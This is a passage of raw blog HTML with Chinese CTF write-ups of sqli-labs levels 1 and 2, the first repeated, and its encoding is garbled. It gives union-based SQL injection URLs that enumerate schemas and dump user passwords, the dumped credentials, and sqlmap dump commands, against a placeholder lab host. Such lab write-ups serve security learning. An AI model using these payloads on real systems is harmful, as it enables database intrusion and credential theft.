class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=&#x27;security&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(username,<span class="hljs-number">0</span>x3a,password) from users --+<br><span class="hljs-comment"># ç»“æœå¦‚ä¸‹æ˜¾ç¤ºï¼š</span><br><span class="hljs-comment"># Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,:</span><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ"><a href="#æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ" class="headerlink" title="æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ"></a>æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+</span><br><span class="hljs-string"># ç»“æœå¦‚ä¸‹æ˜¾ç¤ºï¼š</span><br><span class="hljs-string"># \Dumb\Dumb,\Angelina\I-kill-you,\Dummy\p@ssword,\secure\crappy,\stupid\stupidity,\superman\genious,\batman\mob!le,\admin\admin,\admin1\admin1,\admin2\admin2,\admin3\admin3,\dhakkan\dumbo,\admin4\admin4,\\</span><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•3ï¼šsqlmapå·¥å…·"><a href="#æ–¹æ³•3ï¼šsqlmapå·¥å…·" class="headerlink" title="æ–¹æ³•3ï¼šsqlmapå·¥å…·"></a>æ–¹æ³•3ï¼šsqlmapå·¥å…·</h2><p>â€“dbs:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“<br>â€“tables:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„è¡¨<br>â€“columns:æ˜¯æŸ¥çœ‹è¡¨ä¸­æ‰€æœ‰çš„å­—æ®µå<br>â€“dump:æ˜¯æŸ¥è¯¢å“ªä¸ªè¡¨çš„æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115630.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115932.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115948.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808120010.png" alt="image.png"></p><h1 id="è¯­æ³•ç‚¹"><a href="#è¯­æ³•ç‚¹" class="headerlink" title="è¯­æ³•ç‚¹"></a>è¯­æ³•ç‚¹</h1><h2 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h2><p><strong>ORDER BY</strong>å¯ä»¥å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œåœ¨æ²¡æœ‰æ˜ç¡®æŒ‡å®š<strong>ASC</strong>ï¼ˆå‡åºï¼‰æˆ–<strong>DESC</strong>ï¼ˆé™åºï¼‰çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤æŒ‰å‡åºæ’åˆ—ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">SELECT &lt;åˆ—å1&gt;, &lt;åˆ—å2&gt;, â€¦<br>FROM &lt;è¡¨å&gt;<br>ORDER BY &lt;åˆ—å1&gt;, &lt;åˆ—å2&gt;, â€¦, ASC|DESC;<br></code></pre></td></tr></table></figure><h2 id="SQL-UNION-æ“ä½œç¬¦"><a href="#SQL-UNION-æ“ä½œç¬¦" class="headerlink" title="SQL UNION æ“ä½œç¬¦"></a>SQL UNION æ“ä½œç¬¦</h2><p>UNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚</p><p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚</p><h2 id="DATABASE-å‡½æ•°"><a href="#DATABASE-å‡½æ•°" class="headerlink" title="DATABASE()å‡½æ•°"></a>DATABASE()å‡½æ•°</h2><p>DATABASE()å‡½æ•°è¿”å›å½“å‰æ•°æ®åº“çš„åç§°ã€‚<br>å¦‚æœæ²¡æœ‰å½“å‰æ•°æ®åº“ï¼Œåˆ™æ­¤å‡½æ•°è¿”å›NULLæˆ–â€œâ€ã€‚<br>SELECT DATABASE();</p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">é€‰æ‹©**information_schema**æ•°æ®åº“ï¼š<br>use information_schema;<br>æŸ¥è¯¢ï¼ˆ**information_schema**æ•°æ®åº“é‡Œé¢çš„ï¼‰**tablesè¡¨**ä¸­æ‰€æœ‰çš„**è‡ªå¢ID**ï¼š<br>select auto_increment from tables;<br>å¦‚æœæˆ‘ä»¬æƒ³è¦æŸ¥è¯¢æŒ‡å®šè¡¨çš„è‡ªå¢IDï¼Œå¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ï¼š<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;è¡¨å&#x27;</span>;<br>**å½“ç„¶å¦‚æœæœ‰åŒåçš„æ•°æ®è¡¨ï¼ŒæŸ¥å‡ºæ¥çš„å¯å°±ä¸åªæ˜¯ä¸€æ¡è®°å½•äº†ã€‚å¯ä»¥åŠ ä¸ŠæŒ‡å®šæ•°æ®åº“çš„æ¡ä»¶ã€‚**<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&#x27;æ•°æ®åº“å&#x27;</span> and table_name=<span class="hljs-string">&#x27;è¡¨å&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h2><p>1ã€åŠŸèƒ½ï¼š</p><p>å°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚</p><p>2ã€è¯­æ³•ï¼š</p><p>group_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc&#x2F;desc ] [separator â€˜åˆ†éš”ç¬¦â€™] )</p><h2 id="å°çŸ¥è¯†"><a href="#å°çŸ¥è¯†" class="headerlink" title="å°çŸ¥è¯†"></a>å°çŸ¥è¯†</h2><p>information_schemaï¼šè¡¨ç¤ºæ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº“ã€è¡¨ã€åˆ—<br>information_schema.tablesï¼šè®°å½•æ‰€æœ‰è¡¨åä¿¡æ¯çš„è¡¨<br>information_schema.columnsï¼šè®°å½•æ‰€æœ‰åˆ—åä¿¡æ¯çš„è¡¨<br>table_schemaï¼šæ•°æ®åº“çš„åç§°<br>table_name:è¡¨å<br>column_name:åˆ—å<br>group_concat():æ˜¾ç¤ºæ‰€æœ‰æŸ¥è¯¢åˆ°çš„æ•°æ®</p><p>version():æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬<br>database():æŸ¥çœ‹ä½¿ç”¨çš„æ•°æ®åº“<br>user():æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>limit:limitå­å¥åˆ†æ‰¹æ¥è·å–æ‰€æœ‰æ•°æ®<br>group_concat():ä¸€æ¬¡æ€§è·å–æ‰€æœ‰çš„æ•°æ®åº“ä¿¡æ¯</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076"># SQLæ³¨å…¥ä¸­ï¼Œæ³¨é‡Š#ã€ â€“+ã€ â€“%20ã€ %23åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿsqli-labs-master</a><br>æ–¹æ³•1ï¼š<a href="https://blog.csdn.net/A9874564/article/details/122541945"># Sql-labs ç¬¬ä¸€å…³è¶…è¯¦ç»†è®²è§£</a><br>æ–¹æ³•2å’Œæ–¹æ³•3ï¼š<a href="https://www.cnblogs.com/junlebao/p/13758919.html"># sqli-labsç¬¬ä¸€å…³ è¯¦è§£</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘Sql-labs ç¬¬01å…³ï¼šGET -Error based -Single quotes -String</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91Sql-labs/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91Sql-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬01å…³ï¼šGET-Error-based-Single-quotes-String"><a href="#ç¬¬01å…³ï¼šGET-Error-based-Single-quotes-String" class="headerlink" title="ç¬¬01å…³ï¼šGET -Error based -Single quotes -String"></a>ç¬¬01å…³ï¼šGET -Error based -Single quotes -String</h1><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><h3 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">2</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br><br><span class="hljs-comment"># ç¡®å®šè¡¨ä¸­çš„åˆ—æ•°</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">4</span> --+<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=&#x27;security&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(username,<span class="hljs-number">0</span>x3a,password) from users --+<br><span class="hljs-comment"># ç»“æœå¦‚ä¸‹æ˜¾ç¤ºï¼š</span><br><span class="hljs-comment"># Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,:</span><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ"><a href="#æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ" class="headerlink" title="æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ"></a>æ–¹æ³•2ï¼šç±»ä¼¼æ–¹æ³•1ï¼Œéƒ¨åˆ†è¯­æ³•åŠæ˜¾ç¤ºä¸åŒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+</span><br><span class="hljs-string"># ç»“æœå¦‚ä¸‹æ˜¾ç¤ºï¼š</span><br><span class="hljs-string"># \Dumb\Dumb,\Angelina\I-kill-you,\Dummy\p@ssword,\secure\crappy,\stupid\stupidity,\superman\genious,\batman\mob!le,\admin\admin,\admin1\admin1,\admin2\admin2,\admin3\admin3,\dhakkan\dumbo,\admin4\admin4,\\</span><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•3ï¼šsqlmapå·¥å…·"><a href="#æ–¹æ³•3ï¼šsqlmapå·¥å…·" class="headerlink" title="æ–¹æ³•3ï¼šsqlmapå·¥å…·"></a>æ–¹æ³•3ï¼šsqlmapå·¥å…·</h3><p>â€“dbs:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“<br>â€“tables:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„è¡¨<br>â€“columns:æ˜¯æŸ¥çœ‹è¡¨ä¸­æ‰€æœ‰çš„å­—æ®µå<br>â€“dump:æ˜¯æŸ¥è¯¢å“ªä¸ªè¡¨çš„æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115630.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115932.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115948.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808120010.png" alt="image.png"></p><h2 id="è¯­æ³•ç‚¹"><a href="#è¯­æ³•ç‚¹" class="headerlink" title="è¯­æ³•ç‚¹"></a>è¯­æ³•ç‚¹</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p><strong>ORDER BY</strong>å¯ä»¥å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œåœ¨æ²¡æœ‰æ˜ç¡®æŒ‡å®š<strong>ASC</strong>ï¼ˆå‡åºï¼‰æˆ–<strong>DESC</strong>ï¼ˆé™åºï¼‰çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤æŒ‰å‡åºæ’åˆ—ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">SELECT &lt;åˆ—å1&gt;, &lt;åˆ—å2&gt;, â€¦<br>FROM &lt;è¡¨å&gt;<br>ORDER BY &lt;åˆ—å1&gt;, &lt;åˆ—å2&gt;, â€¦, ASC|DESC;<br></code></pre></td></tr></table></figure><h3 id="SQL-UNION-æ“ä½œç¬¦"><a href="#SQL-UNION-æ“ä½œç¬¦" class="headerlink" title="SQL UNION æ“ä½œç¬¦"></a>SQL UNION æ“ä½œç¬¦</h3><p>UNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚</p><p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚</p><h3 id="DATABASE-å‡½æ•°"><a href="#DATABASE-å‡½æ•°" class="headerlink" title="DATABASE()å‡½æ•°"></a>DATABASE()å‡½æ•°</h3><p>DATABASE()å‡½æ•°è¿”å›å½“å‰æ•°æ®åº“çš„åç§°ã€‚<br>å¦‚æœæ²¡æœ‰å½“å‰æ•°æ®åº“ï¼Œåˆ™æ­¤å‡½æ•°è¿”å›NULLæˆ–â€œâ€ã€‚<br>SELECT DATABASE();</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">é€‰æ‹©**information_schema**æ•°æ®åº“ï¼š<br>use information_schema;<br>æŸ¥è¯¢ï¼ˆ**information_schema**æ•°æ®åº“é‡Œé¢çš„ï¼‰**tablesè¡¨**ä¸­æ‰€æœ‰çš„**è‡ªå¢ID**ï¼š<br>select auto_increment from tables;<br>å¦‚æœæˆ‘ä»¬æƒ³è¦æŸ¥è¯¢æŒ‡å®šè¡¨çš„è‡ªå¢IDï¼Œå¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ï¼š<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;è¡¨å&#x27;</span>;<br>**å½“ç„¶å¦‚æœæœ‰åŒåçš„æ•°æ®è¡¨ï¼ŒæŸ¥å‡ºæ¥çš„å¯å°±ä¸åªæ˜¯ä¸€æ¡è®°å½•äº†ã€‚å¯ä»¥åŠ ä¸ŠæŒ‡å®šæ•°æ®åº“çš„æ¡ä»¶ã€‚**<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&#x27;æ•°æ®åº“å&#x27;</span> and table_name=<span class="hljs-string">&#x27;è¡¨å&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><p>1ã€åŠŸèƒ½ï¼š</p><p>å°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚</p><p>2ã€è¯­æ³•ï¼š</p><p>group_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc&#x2F;desc ] [separator â€˜åˆ†éš”ç¬¦â€™] )</p><h3 id="å°çŸ¥è¯†"><a href="#å°çŸ¥è¯†" class="headerlink" title="å°çŸ¥è¯†"></a>å°çŸ¥è¯†</h3><p>information_schemaï¼šè¡¨ç¤ºæ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº“ã€è¡¨ã€åˆ—<br>information_schema.tablesï¼šè®°å½•æ‰€æœ‰è¡¨åä¿¡æ¯çš„è¡¨<br>information_schema.columnsï¼šè®°å½•æ‰€æœ‰åˆ—åä¿¡æ¯çš„è¡¨<br>table_schemaï¼šæ•°æ®åº“çš„åç§°<br>table_name:è¡¨å<br>column_name:åˆ—å<br>group_concat():æ˜¾ç¤ºæ‰€æœ‰æŸ¥è¯¢åˆ°çš„æ•°æ®</p><p>version():æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬<br>database():æŸ¥çœ‹ä½¿ç”¨çš„æ•°æ®åº“<br>user():æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>limit:limitå­å¥åˆ†æ‰¹æ¥è·å–æ‰€æœ‰æ•°æ®<br>group_concat():ä¸€æ¬¡æ€§è·å–æ‰€æœ‰çš„æ•°æ®åº“ä¿¡æ¯</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076"># SQLæ³¨å…¥ä¸­ï¼Œæ³¨é‡Š#ã€ â€“+ã€ â€“%20ã€ %23åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿsqli-labs-master</a><br>æ–¹æ³•1ï¼š<a href="https://blog.csdn.net/A9874564/article/details/122541945"># Sql-labs ç¬¬ä¸€å…³è¶…è¯¦ç»†è®²è§£</a><br>æ–¹æ³•2å’Œæ–¹æ³•3ï¼š<a href="https://www.cnblogs.com/junlebao/p/13758919.html"># sqli-labsç¬¬ä¸€å…³ è¯¦è§£</a></p><h1 id="ç¬¬02å…³ï¼šGET-Error-based-Integer-based"><a href="#ç¬¬02å…³ï¼šGET-Error-based-Integer-based" class="headerlink" title="ç¬¬02å…³ï¼šGET -Error based -Integer based"></a>ç¬¬02å…³ï¼šGET -Error based -Integer based</h1><h2 id="å‘½ä»¤-1"><a href="#å‘½ä»¤-1" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><h3 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥-1"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥-1" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">3</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">4</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span 